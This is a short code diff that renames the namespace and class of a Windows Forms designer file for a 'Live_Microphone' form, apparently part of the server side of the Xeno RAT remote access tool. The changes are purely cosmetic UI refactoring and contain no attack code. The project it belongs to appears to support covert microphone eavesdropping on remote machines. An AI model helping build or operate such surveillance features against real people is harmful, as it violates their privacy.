@@ -1,6 +1,6 @@
-﻿namespace xeno_rat_server.Forms
+﻿namespace XenoRatServer.Forms
 {
-    partial class Live_Microphone
+    partial class LiveMicrophone
     {
         /// <summary>
         /// Required designer variable.
@@ -89,7 +89,7 @@
             this.button3.UseVisualStyleBackColor = true;
             this.button3.Click += new System.EventHandler(this.button3_Click);
             // 
-            // Live_Microphone
+            // LiveMicrophone
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
@@ -100,9 +100,9 @@
             this.Controls.Add(this.label1);
             this.Controls.Add(this.comboBox1);
             this.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
-            this.Name = "Live_Microphone";
-            this.Text = "Live_Microphone";
-            this.Load += new System.EventHandler(this.Live_Microphone_Load);
+            this.Name = "LiveMicrophone";
+            this.Text = "LiveMicrophone";
+            this.Load += new System.EventHandler(this.LiveMicrophone_Load);
             this.ResumeLayout(false);
             this.PerformLayout();
 
